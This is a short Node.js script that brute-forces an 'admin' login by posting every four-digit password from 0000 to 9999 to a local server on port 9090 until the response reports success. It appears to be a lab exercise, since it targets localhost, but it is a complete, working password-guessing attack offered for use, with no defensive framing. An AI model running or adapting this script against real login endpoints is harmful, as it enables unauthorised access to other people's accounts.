const axios = require('axios');

let thread = 0;
let maxThread = 50;

async function bruteforceAttack() {
    for (thousanthDigit = 0; thousanthDigit < 10; thousanthDigit++) {
        for (hundredthDigit = 0; hundredthDigit < 10; hundredthDigit++) {
            for (tenthDigit = 0; tenthDigit < 10; tenthDigit++) {
                for (onceDigit = 0; onceDigit < 10; onceDigit++) {
                    while (thread === maxThread) await new Promise(done => setTimeout(() => done(), 1));
                    thread++;
                    let postData = {
                        username: 'admin',
                        password: String.prototype.concat(thousanthDigit, hundredthDigit, tenthDigit, onceDigit)
                    };
                    console.log(`Sending request with password = ${postData.password}`);
                    try {
                        let res = await axios.post('http://localhost:9090/', postData);
                        console.log(res.data);
                        if (res.data.success === true) return postData.password;
                    } catch (err) {
                        console.log(err);
                    } finally {
                        thread--;
                    }
                }
            }
        }
    }
}

async function findPassword() {
    let password = await bruteforceAttack();
    console.log(`Password is ${password}`);
}

findPassword();
